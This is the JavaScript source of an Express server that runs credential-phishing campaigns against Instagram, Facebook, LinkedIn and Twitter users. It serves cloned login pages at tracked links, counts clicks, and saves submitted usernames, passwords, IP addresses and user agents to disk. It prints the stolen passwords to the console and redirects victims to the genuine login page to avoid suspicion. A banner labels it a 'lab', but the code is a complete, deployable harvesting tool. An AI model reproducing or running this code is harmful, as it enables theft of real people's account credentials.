const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Data directory
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);

// Campaign storage
const campaigns = {};

// ==================== API ROUTES ====================

// 1. Create a new phishing campaign
app.post('/api/create-campaign', (req, res) => {
    const { platform } = req.body;
    if (!['instagram', 'facebook', 'linkedin', 'twitter'].includes(platform)) {
        return res.status(400).json({ error: 'Invalid platform' });
    }

    const campaignId = crypto.randomBytes(8).toString('hex');
    
    // CRITICAL FIX: Use the request's host (works on both localhost and Render)
    const baseUrl = `${req.protocol}://${req.get('host')}`;
    
    const campaign = {
        id: campaignId,
        platform,
        createdAt: new Date().toISOString(),
        clicks: 0,
        credentials: [],
        link: `${baseUrl}/phish/${campaignId}`
    };

    campaigns[campaignId] = campaign;

    // Save to file
    fs.writeFileSync(
        path.join(DATA_DIR, `${campaignId}.json`),
        JSON.stringify(campaign, null, 2)
    );

    console.log(`[+] Campaign created: ${campaign.platform} -> ${campaign.link}`);
    res.json({ success: true, campaign });
});

// 2. Serve the phishing page (tracks clicks)
app.get('/phish/:campaignId', (req, res) => {
    const { campaignId } = req.params;
    const campaign = campaigns[campaignId];

    if (!campaign) {
        return res.status(404).send('Campaign not found');
    }

    // Increment click counter
    campaign.clicks++;
    saveCampaign(campaignId);

    // Serve the appropriate template
    const templatePath = path.join(__dirname, 'templates', `${campaign.platform}.html`);
    if (!fs.existsSync(templatePath)) {
        return res.status(500).send('Template not found');
    }

    let template = fs.readFileSync(templatePath, 'utf8');
    template = template.replace(/{{CAMPAIGN_ID}}/g, campaignId);
    res.send(template);
});

// 3. Capture credentials
app.post('/api/capture', (req, res) => {
    const { campaignId, username, password } = req.body;
    const campaign = campaigns[campaignId];

    if (!campaign) {
        return res.status(404).json({ error: 'Campaign not found' });
    }

    const entry = {
        id: crypto.randomBytes(4).toString('hex'),
        username,
        password,
        timestamp: new Date().toISOString(),
        ip: req.ip || req.connection.remoteAddress,
        userAgent: req.headers['user-agent'] || 'Unknown'
    };

    campaign.credentials.push(entry);
    saveCampaign(campaignId);

    // Log to console for real-time viewing
    console.log(`\n[+] CREDENTIAL CAPTURED - ${campaign.platform.toUpperCase()}`);
    console.log(`    Username: ${username}`);
    console.log(`    Password: ${password}`);
    console.log(`    Time: ${entry.timestamp}\n`);

    // Redirect to real login page (stealth)
    const redirects = {
        instagram: 'https://www.instagram.com/accounts/login/',
        facebook: 'https://www.facebook.com/login/',
        linkedin: 'https://www.linkedin.com/login/',
        twitter: 'https://twitter.com/login'
    };

    res.json({ 
        success: true, 
        redirect: redirects[campaign.platform] || redirects.instagram,
        message: 'Login failed, redirecting...'
    });
});

// 4. Get campaign stats for dashboard
app.get('/api/campaign/:campaignId', (req, res) => {
    const campaign = campaigns[req.params.campaignId];
    if (!campaign) {
        return res.status(404).json({ error: 'Campaign not found' });
    }
    // Add current base URL to response
    const baseUrl = `${req.protocol}://${req.get('host')}`;
    res.json({ campaign, baseUrl });
});

// 5. Get all campaigns
app.get('/api/campaigns', (req, res) => {
    const baseUrl = `${req.protocol}://${req.get('host')}`;
    const list = Object.values(campaigns).map(c => ({
        id: c.id,
        platform: c.platform,
        clicks: c.clicks,
        credentialsCount: c.credentials.length,
        createdAt: c.createdAt,
        link: c.link
    }));
    res.json({ campaigns: list, baseUrl });
});

// Helper: Save campaign to disk
function saveCampaign(campaignId) {
    const campaign = campaigns[campaignId];
    if (campaign) {
        fs.writeFileSync(
            path.join(DATA_DIR, `${campaignId}.json`),
            JSON.stringify(campaign, null, 2)
        );
    }
}

// Load existing campaigns on startup
function loadCampaigns() {
    if (!fs.existsSync(DATA_DIR)) return;
    const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith('.json'));
    files.forEach(file => {
        try {
            const data = fs.readFileSync(path.join(DATA_DIR, file), 'utf8');
            const campaign = JSON.parse(data);
            campaigns[campaign.id] = campaign;
        } catch (e) {
            console.error(`Failed to load ${file}:`, e.message);
        }
    });
    console.log(`[+] Loaded ${files.length} existing campaigns`);
}

loadCampaigns();

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`  PHISHING LAB SERVER RUNNING`);
    console.log(`  Interface: http://localhost:${PORT}`);
    console.log(`  Dashboard: http://localhost:${PORT}/dashboard.html`);
    console.log(`========================================\n`);
});